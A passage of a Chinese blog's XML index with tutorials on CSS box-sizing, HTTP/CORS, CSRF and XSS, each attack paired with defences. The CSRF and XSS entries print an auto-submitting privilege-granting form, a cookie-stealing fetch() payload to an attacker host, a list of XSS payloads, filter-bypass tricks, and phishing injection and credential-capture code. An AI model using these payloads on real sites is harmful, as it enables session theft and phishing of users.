    <content type="text"><![CDATA[想必大多数人都用过 box-sizing 属性吧？那么这个属性的值对应的 css 盒子模型宽高计算方式有什么区别呢？ css 盒子模型 首先我们来看看 css 盒子模型宽度和高度的计算： 宽度 = border(left&amp;&amp;right) + padding(left&amp;&amp;right) + contentWidth(或者手动设置的元素宽度) 高度 = border(top&amp;&amp;bottom) + padding(top&amp;&amp;bottom) + contentHeight(或者手动设置的元素高度) 这看起来可能会有些抽象，我们通过图片来简单讲解一下： 如图所示，盒子的宽度 = 40(px) 2 + 2(px) 2 + 236(px) = 320px; 盒子高度计算方式类似。 box-sizing 用于改变 css 盒子模型计算宽高的方式，有两个值，一个 content-box(默认值)，另一个 border-box。下面我们来分析一下这两个值。 content-boxcontent-box 是默认值。它是如何计算元素的宽高的呢？如下图所示首先我们设置 box 的宽高为 100px，边宽 2px，内边距（padding) 10px： 然后 WTF，box 宽度变为 124 px 了? 明明我是想设置宽度为 100px 的呀？这种情况是不是有点似曾相识的感觉【滑稽】注意: content-box 为默认值所以不用写 box-sizing: content-box; 也行，浏览器会自动加上。 其实当 box-sizing 为 content-box 的时候，如果你设置元素宽度（width）或高度（height），实际上设置的是 content 的宽高（标题图的content）并不是盒子的宽高。也就是说实际宽度为： 宽度 = border + padding + width(你手动设置的宽度) border-box如果我们给 box 设置 box-sizing: border-box 会发生什么呢？如下图： 我们可以看到 box 的宽高变回 100px * 100px 了，好神奇呀，这就是我们想要的答案。 如果我们给元素设置 box-sizing: border-box; 那么该元素的宽高计算方式为（以宽举例）： 宽度 = width(你手动设置的宽度) width(你手动设置的宽度) = border + padding + content; 既然设置为 border-box 是我们更期望的渲染行为，那么我们是否应该设置全部元素为 border-box 呢？ 123* &#123; box-sizing: border-box;&#125; 答案是否，因为大部分元素你不需要手动设置宽高，在需要手动设置宽高的元素上再使用是一种更好的选择。当然你要这么使用也没什么问题～]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>box-sizing</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊一聊 HTTP]]></title>
    <url>%2Fhttp%2F</url>
    <content type="text"><![CDATA[下文中的CORS内容大部分摘自 HTTP访问控制（CORS），这里进行了部分更改 HTTP 简介HTTP 超文本传输协议(Hypertext Transper Protocol)，应用层协议。基于一种请求/响应的工作模式。即当客户端与服务器连接后，客户端发送请求，服务器给出响应。 接下来我们从常用请求方法、HTTP Headers、响应状态码、跨资源共享 4 个方面进行分析。 常用请求方法虽然 HTTP 规范定义一系列方法，但是常用的无非 GET、POST、HEAD、CONNECT； GET GET 方法请求一个指定资源的表示方式。使用 GET 方法应该只用于获取数据 POST POST 方法用于将实体提交给指定的资源，通常导致状态或服务器上的副作用的更改 HEAD HEAD 方法请求一个与 GET 请求的响应相同的相应，但没有响应体。此方法经常用于测试超文本连接的有效性、可访问性、和最近的改变 CONNECT CONNECT 方法建立一个到由目标资源标识的服务器的隧道 HTTP HeadersHTTP 规范也定义了一系列 Headers 信息，但是大部分不需要我们开发人员关心，浏览器已经帮我们实现好了。我们来看看几个比较重要的 Headers 信息。 Content-Type在响应中，Content-Type标头告诉客户端实际返回的内容的内容类型，如： Content-Type: text/html; charset=utf-8 Content-Type: multipart/form-data; boundary=something 常见类型有： text/html text/plain text/css text/javascript application/x-www-form-urlencoded multipart/form-data application/json application/xml 指令： media-type 资源或数据的 MIME type 。 charset 字符编码标准。 boundary 对于多部分实体，boundary 是必需的，其包括来自一组字符的1到70个字符，已知通过电子邮件网关是非常健壮的，而不是以空白结尾。它用于封装消息的多个部分的边界。 CookieHTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。 Cookie 主要用于以下三个方面： 会话状态管理（如用户登录状态、购物车、游戏分数或其他需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如分析用户行为等） cookie 安全相关各个属性| 属性 | 结果 || :—————————– | :–: || value | 如果保存用户登录态，应该将该值加密，不能使用明文的用户标识 || http-only | 不能通过 js 访问 cookie，减少 XSS 攻击|| secure | 只能在协议为 https 的请求中携带 || same-site | 制定浏览器不能再跨域的请求中携带 cookie, 减少 CSRF 攻击 | 跨资源请求相关 HeaderAccess-Control-Allow-Origin 等信息，具体看下文[跨资源共享模块] 响应状态码状态码分为5大类： 1XX（信息描述）：接受的请求正在处理 2XX（成功状态）：请求正常处理完毕。其中 206 表示请求部分内容成功 3XX（重定向状态）：服务器要求客户端重定向 4XX （客户端错误）：服务器无法处理请求 5XX （服务器错误）：服务器处理请求出错 常用状态码 200: 客户端请求成功 301: 资源永久重定向 302: 资源暂时重定向 304: 请求资源未改动（不会返回任何资源，客户端利用本地缓存资源） 400: 客户端请求参数错误 401: 请求未授权 403: 服务器拒绝接受服务 404：请求资源不存在 500: 服务器发生不可预期错误 503: 服务器当前不能处理客户端请求 跨资源访问（CORS）当一个资源从与该资源本身所在的服务器不同域或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站有权访问哪些资源。 为了防止 CSRF 跨站攻击，浏览器对跨域请求做了限制，即跨资源共享（CORS）机制，具体如下： 简单请求（不会引起其他副作用的请求），直接发起请求，如果服务器拒绝跨域，浏览器会对请求结果进行拦截，否则通过请求。 对于可能对服务器产生副作用的 HTTP 请求方法，浏览器必须首先使用 OPTIONS 方法发起一个预测请求，从而获知服务端是否允许跨域请求，服务器确认允许之后，才发起实际的HTTP 请求。在预测请求的返回中，服务端也可以通知客户端，是否需要携带身份凭证。 有些浏览器不允许从 HTTPS 的域跨域访问 HTTP，比如 Chrome 和 Firefox，这些请求还为发起就被拦截。 一个源的定义如果协议、端口和域名对于当前访问页面是相同的，则两个页面同源。 例如当前访问页面为：http://www.example.com/test URL 结果 原因 http://www.example.com/test1 成功 https://www.example.com/test1 失败 协议不同 http://www.example.com:81/test 失败 端口不同 http://news.example.com/test 失败 不同域名 IE例外 授信范围：两个相互之间高度互信的域名，如公司域名，不遵守同源策略的限制。 端口：IE 未将端口号加入到同源策略的组成成分之中。 简单请求满足下列条件的请求，可被视为“简单请求”： 下列方法之一 GET HEAD POST Fetch 规范定义对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段，该集合为： Accept Accept-Language Content-Language Content-Type(有额外限制，参见下文) DPR Downlink Save-Data Viewport-Width Width Content-Type 的值仅限于下列三者之一： text/plain multipart/form-data application/x-www-form-urlencoded 列如下面这个请求，站点http://bar.other 访问站点 http://foo.example 资源： 1234567891011121314151617181920GET /resources/public-data/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3preAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Connection: keep-aliveReferer: http://foo.example/examples/access-control/simpleXSInvocation.htmlOrigin: http://foo.exampleHTTP/1.1 200 OKDate: Mon, 01 Dec 2008 00:23:53 GMTServer: Apache/2.0.61 Access-Control-Allow-Origin: *Keep-Alive: timeout=2, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: application/xml 这里有两个比较特殊的首部字段： Origin: 在第 10 行，表明该请求来源于 http://foo.example Access-Control-Allow-Origin: 在第16行，值为：*，表明该资源可以被任意的域访问，如果服务端仅允许来自 http://foo.example 的访问，首部字段应该如下： 1Access-Control-Allow-Origin: http://foo.example 需要检测的请求如前文所述，需要检测的请求，需要先发起一个 OPTIONS 预检请求到服务器， 满足下述任意条件时，应首先发起预检请求： 使用了下列任一方法 PUT DELETE CONNECT OPTIONS TRACE PATCH 人为设置了 CORS 安全的首部字段集合之外的其他首部字段，该集合为： Accept Accept-Language Content-Language Content-Type(有额外限制，参见下文) DPR Downlink Save-Data Viewport-Width Width Content-Type 的值不属于下列之一： application/x-www-form-urlencoded multipart/form-data text/plain 如下是一个需要执行预检请求的 HTTP 请求： 12345678910111213let invocation = new XMLHttpRequest();let url = 'http://bar.other/resources/post-here/';let body = '&lt;?xml version="1.0"?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;'; function callOtherDomain() &#123; if (invocation) &#123; invocation.open('POST', url, true); invocation.setRequestHeader('X-PINGOTHER', 'pingpong'); invocation.setRequestHeader('Content-Type', 'application/xml'); invocation.onreadystatechange = handler; invocation.send(body); &#125;&#125; 上面的代码使用 POST 请发送一个 XML 文档，包含自定义首部 X-PINGOTHER: pingpong。另外请求的 Content-Type 为 application/xml。因此，该请求需要首先发起”预检请求”。 1234567891011121314151617181920212223242526OPTIONS /resources/post-here/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3preAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Connection: keep-aliveOrigin: http://foo.exampleAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: X-PINGOTHER, Content-TypeHTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: X-PINGOTHER, Content-TypeAccess-Control-Max-Age: 86400Vary: Accept-Encoding, OriginContent-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 预检请求完成后，发送实际请求： 1234567891011121314151617181920212223242526272829POST /resources/post-here/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3preAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Connection: keep-aliveX-PINGOTHER: pingpongContent-Type: text/xml; charset=UTF-8Referer: http://foo.example/examples/preflightInvocation.htmlContent-Length: 55Origin: http://foo.examplePragma: no-cacheCache-Control: no-cache&lt;?xml version=&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:40 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://foo.exampleVary: Accept-Encoding, OriginContent-Encoding: gzipContent-Length: 235Keep-Alive: timeout=2, max=99Connection: Keep-AliveContent-Type: text/plain 从上面的报文中我们看到，第1-12 行发送了一个 OPTIONS 方法的“预检请求”。OPTIONS 是 HTTP/1.1 的方法，用以从服务器获取更多的信息，该方法不会对服务器资源产生影响。预检请求携带了下面连个首部字段： 12Access-Control-Request-Method: POSTAccess-Control-Request-Headers: X-PINGOTHER Access-Control-Request-Method 告知服务器，实际使用的请求方法，在这里是 POST。 Access-Control-Request-Headers 告知服务器，实际请求携带的自定义首部字段，在这里是 X-PINGOTHER 和 Content-Type。 服务器据此决定，该请求是否被允许。 第 14-16 行为预检请求的响应， 表明服务器将接受后续的实际请求。重点看 17-19 行： 1234Access-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: X-PINGOTHER, Content-TypeAccess-Control-Max-Age: 86400 Access-Control-Allow-Methods：表示服务器允许客户端使用的请求方法，在这里是 POST、GET、OPTIONS。 Access-Control-Allow-Headers：表示服务器允许请求中携带的自定义字段，在这里是X-PINGOTHER, Content-Type。与 Access-Control-Allow-Methods 一样，Access-Control-Allow-Headers 的值为英文逗号分隔的列表。 Access-Control-Max-Age：表示该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器维护了一个最大的有效时间，如果该首部字段的超过了最大的有效时间，将不会生效。 附带身份凭证的请求Fetch 与 CORS 的一个有趣的特性是，可以基于 HTTP cookies 和 HTTP 认证信息发送身份凭证。一般而言，对于跨域 XMLHttpRequest 或 Fetch 请求，浏览器不会发送身份凭证信息。如果要发送凭证信息，需要设置 XMLHttpRequest 的某个特殊标识位。 如下，http://foo.example 的某脚本 向 http://bar.other 发起一个 GET 请求，并设置 Cookie: 1234567891011let invocation = new XMLHttpRequest();let url = 'http://bar.other/resources/credentialed-content/'; function callOtherDomain() &#123; if (invocation) &#123; invocation.open('GET', url, true); invocation.withCredentials = true; invocation.onreadystatechange = handler; invocation.send(); &#125;&#125; 第 7 行将 XMLHttpRequest 的 withCredentials 的标志设置为 true，从而向服务器发送 Cookie。因为这是一个简单的 GET 请求，所以浏览器不会发起预检请求。但是，如果服务器的响应中未携带 Access-Control-Allow-Credentials: true，浏览器将不会把响应内容返回给请求的发送者。 Fetch 的特殊标志如下：credentials: ‘include’ 12345678910let requestConfig = &#123; credentials: 'include', method: type, headers: &#123; 'Accept': 'application/json', 'Content-Type' : 'application/json' &#125;, mode: "cors", cache: "force-cache"&#125; 附带身份凭证的请求与通配符对于附带身份凭证的请求，服务器不得设置 Access-Control-Allow-Origin 的值为”*”。 这是因为请求的首部中携带了 Cookie 的信息，如果 Access-Control-Allow-Origin 的值为 “*”，请求将会失败。 form 表单的跨域问题当 form 表单跨域提交数据的时候，原页面会跳转到新页面（这样原页面脚本便无法获取新页面的内容，浏览器因此认为是安全的），相当于 a 标签跳转一样，因而会带上缓存在本地的新页面的 cookie，并且可以提交成功。（这也是 csrf 能攻击成功，而不会被同源策略限制的原因） 但是因为不同源之间的跳转，request 也会带上 origin，refer等字段，可以依据这些字段限制不可信的跨域访问，这些涉及到 csrf 防御的问题了，在另一篇 csrf 防御和攻击有详细说明。 HTTP 响应首部字段本节列出了规范所定义的响应首部字段。上一小节中，我们已经看到了这些首部字段在实际场景中是如何工作的。 Access-Control-Allow-Origin响应首部中可以携带一个 Access-Control-Allow-Origin字段，其语法如下: 1Access-Control-Allow-Origin: &lt;origin&gt; | * 其中，origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。 例如，下面的字段值将允许来自 http://mozilla.com 的请求： 1Access-Control-Allow-Origin: http://mozilla.com 如果服务端指定了具体的域名而非“*”，那么响应首部中的 Vary 字段的值必须包含 Origin。这将告诉客户端：服务器对不同的源站返回不同的内容。 Access-Control-Expose-Headers译者注：在跨域访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。 Access-Control-Expose-Headers 头让服务器把允许浏览器访问的头放入白名单，例如： 1Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header 这样浏览器就能够通过getResponseHeader访问X-My-Custom-Header和 X-Another-Custom-Header 响应头了。 Access-Control-Max-AgeAccess-Control-Max-Age 头指定了preflight请求的结果能够被缓存多久，请参考本文在前面提到的preflight例子。 1Access-Control-Max-Age: &lt;delta-seconds&gt; delta-seconds 参数表示preflight请求的结果在多少秒内有效。 Access-Control-Allow-CredentialsAccess-Control-Allow-Credentials 头指定了当浏览器的credentials设置为true时是否允许浏览器读取response的内容。当用在对preflight预检测请求的响应中时，它指定了实际的请求是否可以使用credentials。请注意：简单 GET 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页。 1Access-Control-Allow-Credentials: true 上文已经讨论了附带身份凭证的请求。 Access-Control-Allow-MethodsAccess-Control-Allow-Methods 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。 1Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]* 相关示例见这里。 Access-Control-Allow-HeadersAccess-Control-Allow-Headers 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。 1Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* HTTP 请求首部字段本节列出了可用于发起跨域请求的首部字段。请注意，这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪。 OriginOrigin 首部字段表明预检请求或实际请求的源站。 1Origin: &lt;origin&gt; origin 参数的值为源站 URI。它不包含任何路径信息，只是服务器名称。 Note: 有时候将该字段的值设置为空字符串是有用的，例如，当源站是一个 data URL 时。 注意，不管是否为跨域请求，ORIGIN 字段总是被发送。 Access-Control-Request-MethodAccess-Control-Request-Method 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。 1Access-Control-Request-Method: &lt;method&gt; 相关示例见这里。 Access-Control-Request-HeadersAccess-Control-Request-Headers 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。 1Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF 攻击和防御]]></title>
    <url>%2FCSRF%20%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[CSRF 介绍CSRF（Cross Site Request Forgery，跨站请求伪造），顾名思义就是攻击者盗用（利用）你的身份凭证，进行未经用户许可的恶意操作。与 XSS 不同的是，CSRF 直接利用用户当前的身份凭证，而 XSS 主要是窃取用户的身份凭证。 CSRF 危害CSRF 盗用受害者身份，完成受害者未经过授权的操作，能做的非常多： 银行非法转账 非法添加管理 利用用户发送电子邮电 修改用户密码 ….. CSRF 原理我们结合一个简单的 demo 和下图分析一下 浏览并登录收信任的网站 A，这里我们假设是（//127.0.0.1:3000/login)，并且是一个银行网站，如下图： 通过验证，在用户的浏览器上种植下 Cookie，如上图所示，sessionID 记录了用户的登录状态，可以看到可以转账成功了 用户在没有登出 A 网站的情况下，访问网站 B，这里我们假设是（//127.0.0.1:8888），可以看到 hacker 已经在“点击这里有惊喜”种下攻击代码了 ​ ​ B 要求访问第三方网站 A（//127.0.0.1:3000)，当用户经不住诱惑或者不小心点了带攻击的链接，就会对第三方网站 A 发起转账的请求。 根据第 4 步的请求，浏览器带着第 1 步种植的 cookie，向 A 网站发起转账请求，A 网站检验到是合法用户（因为带的 cookie 是合法的），于是同意转账，攻击完成。 其他案例 CSRF 理解通过上面的分析，我们可以发现实现一个 CSRF 攻击，需要由四部分组成： 有一个无需后台验证的前端或后台数据修改或新增的漏洞存在，或者有可以欺骗后台验证的前端或后台数据修改或新增的漏洞存在； 如果需要认证，还需要用户当前缓存的认证信息有效。 伪造数据操作请求的恶意链接或者页面； 诱惑用户主动访问或登录恶意链接，出发非法操作； 主要存在于用户密码修改、购物地址的修改或后台管理账户的新增等等操作过程。 CSRF 利用方式利用 CSRF 攻击，主要包含两种方式，一种是基于 GET 请求的利用，就如上面例子介绍的那样，直接构造攻击 url，另一种是基于 POST 请求方式的利用。 POST 也没什么，一个 form 表单搞定： 12345678&lt;script&gt;$(function() &#123; $(&apos;#CSRF_forCSRFm&apos;).trigger(&apos;submit&apos;);&#125;);&lt;/script&gt;&lt;form action=&quot;http://a.com/user/grant_super_user&quot; id=&quot;CSRF_form&quot; method=&quot;post&quot;&gt; &lt;input name=&quot;uid&quot; value=&quot;121&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt; 注意：form 表单是不存在跨域问题的，提交 form 表单会带上 cookie。不要老怪 CORS，因为 form 表单跨域提交，会跳转页面，原页面脚本无法获取新页面的内容，因此浏览器认为是安全的，可以理解为 a 标签的跳转；CORS 主要是用来防止第三方脚本|代码在当前页面运行。通过其他方式发起请求，CORS 就很有作用了。 CSRF防范既然 CSRF 攻击的核心是利用登录用户的认证信息，而手段大多是从第三方网站发起，我们可以从以下三个方案进行防范： referer 验证 验证机制 token referer 验证HTTP 协议里面定义了一个 referer 字段，记录了访问来源，所以我们可以判断 referer，非收信任的 referer 拒绝访问。但是容易绕过，真正到了需要验证的时候，作用不大。 验证机制当用户进行敏感信息修改，财产等严重问题时，可以加一层验证机制： 输入当前用户密码，防止未授权用户 验证码验证 第二个密码，比如支付密码等 虽然会牺牲一部分用户体验，但是为了用户信息财产安全，有些地方使用还是有必要的。 token添加基于当前用户身份的有效 tokens 随机验证机制，即在向后端提交数据操作请求时，添加基于当前用户的随机 token 校验值，此种方法当前使用的比较多。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS 攻击和防御]]></title>
    <url>%2FXSS%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[XSS 简介xss 全称(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheet, CSS) 缩写混淆，因此写作 XSS。属于一种脚本注入攻击，也就是攻击者把恶意脚本、html注入网站，当前其他用户访问的时候，这些恶意脚本、html 就在注入的网站的上下文中运行，从而对访问者造成攻击。 XSS 攻击危害 盗取用户 Cookie：有一天你发现仅剩 4 块钱（一个桶面）余额的银行卡，被转走了3.5 块到一位陌生用户，痛哭流涕的想着自己的晚餐（桶面）的情况下拨通了客服电话，接电话的还是个男的，顿时火冒三丈：谁转走了我的桶面，哦不，3.5 块? 客服查了下转账记录说：先生，您于某时某分某地登录银行网站转了 3.5 块给某某。此处省略1000字…….，很可能就是 Cookie 被盗走了，利用你在网站的权限把钱转走，还有 5 毛买个糖瓜吧。 导航到恶意网站：点击某个连接，进去的却是另外一个恶俗网站。 记录用户行为：攻击者可以通过使用 addEventListener 方法注册监听键盘事件的回调函数，并把所有用户行为发送到服务器，这些敲击行为可能记录者用户的敏感信息，比如密码和信用卡信息。 插入广告：是否有过这样的经历，当你通过某个连接进入某个网站的时候发现一顿不堪入目的广告（前提的是你没开广告拦截器） 钓鱼网站：这个词是否经常在某某新闻 APP 上看到？攻击者修改 DOM 插入假的登录框，或者把表单的action 属性指向他自己的服务器，然后欺骗用户提交用户的铭感信息。 XSS 攻击方式既然 XSS 可以造成这么大危害，当然应该建立一些防范措施。但是，不急，在聊防范方式之前，我们先来分析 XSS 是怎么实现上述攻击的？有哪些攻击方式？如何联合其他攻击方式一起使用？ XSS 共分为三种攻击方式，从易用上，存储型 XSS &gt; DOM 型 XSS &gt; 反射型 XSS。 存储型 XSS我们从简单的开始，存储型 XSS 就是存入了数据库，在取出来，导致 XSS。比较典型的地方是：消息论坛，评论区，留言板 XSS。攻击者构造好攻击代码，提交到评论区，当其他用户进入这个页面的时候，浏览器从服务器拉取数据，并做正常的 html 和 js 解析执行，进而触发 XSS 攻击。 1户访问页面 &gt; 浏览器获取 html | js（包括攻击代码）解析执行 &gt; 完成攻击 那么攻击者是如何发现 XSS 漏洞，有是如何构造攻击代码提交到评论区的呢？这是一个比较大问题，这里分析个简单的demo，要看整个攻击的分析过程请转 刘志龙大神-从零开始学 web 安全 原本的留言版如下： 为了简单点，上图的 input 没有做任何过滤与转码，我们直接提交下面的代码（这其实就是一种常见的 XSS payload。具体请看下文分析）： 1hi, 你的 cookie 要被盗了哟&lt;img src=1 onerror=&quot;fetch(`http://www.xsshack.com/?cookie=$&#123;document.cookie&#125;`)&quot; /&gt; 可以发现已经将攻击代码注入到留言区了： 当其他用户访问当前页面的时候，cookie 就会被盗取（demo 的 url 随意写的，因此respose 会 502）： DOM 型 XSS简单理解就是它的输出点在 DOM，和后端完全没有关系，攻击者只要诱导别人去点击有 XSS 代码的 URL 就能实现攻击。看下面的 demo： 原始代码 带有 XSS 代码的 URL，只要将这个链接发出去，诱导其他人点击就能造成攻击，这里同样用了上面例子的 payload (还挺好用的 ^_^) 反射型 XSS反射型 XSS，也是通过给别人发送带有 XSS 代码的链接，诱导其他人点击进而造成攻击。与 DOM 型 XSS 不同的是，这类型攻击一般出现在搜索页面，需要将注入代码从目标服务器通过错误信息、搜索结果等方式“反射”回来，在受害者浏览器上执行，而 DOM 型 XSS 是不需要经过目标服务器的，明白这点就很容易区分 反射性 XSS 和 DOM 型 XSS 了。 看下面这个经典案例： 如下登录页面，我们为了用户能在登录之后访问到之前浏览的页面，所以在url加入了一个service参数，但是未对它做任何校验，可能会被钓鱼网站利用。 该攻击实现条件： 用户点击了如下连接：https://cas.utest.qq.com/qqlogin?service=http%3A%2F%2Fpianzi.com； 后端未对service参数做校验，这个连接可以正常跳转到上图的页面； 用户输入帐号登录后，跳转到 pianzi.com； 这是个钓鱼网站，通过网站风格欺骗，对用户进行引导性操作； 用户输入一些有用的信息； 在不知不觉之间，用户泄漏了自己的信息。 XSS payload上面有谈到窃取 cookie 的 demo 中谈到了 XSS payload, XSS payload 是什么？ XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用已完成各种具体功能的恶意脚本，被称为”XSS payload”。 XSS Payload实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何Javascript脚本能实现的功能，XSS Payload都能做到。 举几个列子，非常多： 12345678910111213&lt;script&gt;alert(1)&lt;/script&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;iframe onload=alert(1)&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;111&lt;/a&gt;&lt;marquee onscroll=alert(1)&gt;&lt;object data=&quot;javascript:alert(1)&quot;&gt;&lt;svg onload=alert(1)&gt;&lt;body onload=alert(1)&gt;&lt;select name=&quot;&quot; onmouseover=alert(1)&gt;&lt;script&gt;window.setAttribute(&apos;onload&apos;,alert(&apos;xss&apos;)&lt;/script&gt;Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;img src=1 onerror=with(body)createElement(&apos;script&apos;).src=&quot;外部JS地址&quot;&gt; 入侵方法（摘自XSS的利用方式—-(朽木原创)攻击者发现xss漏洞-&gt;构造代码-&gt;发送给受害人-&gt;受害人打开-&gt;窃取受害人cookie-&gt;完成攻击. 盗取cookie:可以使用现成的xss平台. 如果cookie中的某些关键值加了HttpOnly,那么就可以避免该网页的cookie被客户端的JS存取，也就保护了用户的cookie不被盗取. 当前可见的绕过Httponly的方法大致可以分为两类：一类是服务器配置或功能实现上存在可能被利用的弱点，可归结为服务端的信息泄露。如利用404 页、PHPINFO页，Trace方法等绕过HTTPonly；另一类是客户端漏洞或功能上存在可以被利用的弱点，可归结为客户端的信息泄露。如 MS08-069、利用ajax或flash读取set-cookie等。 绕过防御 过滤了alert(1)的括号,可以用alert1 //反引号 利用js字符串模块 eval.call${&#39;\141\154\145\162\164\50\61\51&#39;} 转换大小写alert(1) 绕过Php的htmlspecialchars() Php的htmlspecialchars()默认能将&lt; &gt; &amp; “转成&lt; &gt; &amp; “ 如果用了htmlspecialchars($name, ENT_QUOTES); 则 ’ 也会被转成 ‘ 如果用了 htmlspecialchars ($name, ENT_NOQUOTES);则单双引号都不会被转换。 J**s中可用以下代码绕过**： Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)) H**tml中可用以下代码绕过**: ‘ onmouseover=’alert(1) 源代码是 变成了 2.php源代码 &lt;?php $name = $_GET[“name”]; $name = htmlspecialchars($name); ?&gt; 地址栏输入http://127.0.0.1/2.php?name=’ onmouseover=’alert(1)后回车 然后将鼠标移到那个框框后， 弹出弹窗. Xss钓鱼(挂马): (1)xss重定向钓鱼 如自己建一个钓鱼网站www.xiumu.com, 然后受害者访问如下地址http://www.test.com/a.php?id=””&gt;document.location.href=”http://www.xiumu.com” 或者http://www.test.com/a.php?id=””&gt;&lt;iframe src=”http://www.xiumu.com” height=0 width=0 &gt; (2)HTML注入式钓鱼 直接利用XSS漏洞注射HTML/js 代码到页面中.可写一个正常的HTML表单来窃取账号密码.如:http://www.test.com/a.php?id=””loginusernamepassword 这样当用户直接填入账号密码提交后，你就可以在xiumu.php接收到受害者的账号密码了. Xiumu.php代码:&lt;?php echo $_POST[‘a’]?&gt;&lt;?php echo $_POST[‘b’]?&gt; (3)Xss跨框架钓鱼 这种方式是通过嵌入远程域的一个页面实施钓鱼,http://www.test.com/a.php?id=””&gt;&lt;iframe src=”http://www.xiumu.com” height=”100%” width=”100%”&gt;将www.xiumu.com的页面做的和test的页面相同(可利用iframe实现)，但受害者看到的不是真正的test页面，而是xiumu页面. （4）xss.tv 是个好网站 常用编码刘志龙大神分析的很好，这里就不再赘述，刘志龙-从零开始学web安全（3） XSS 防御XSS防御基本上遵循七条原则: 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码 使用富文本时，使用XSS规则引擎进行编码过滤 参考链接]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5 唤起 APP]]></title>
    <url>%2FH5%20%E5%94%A4%E8%B5%B7%20APP%2F</url>
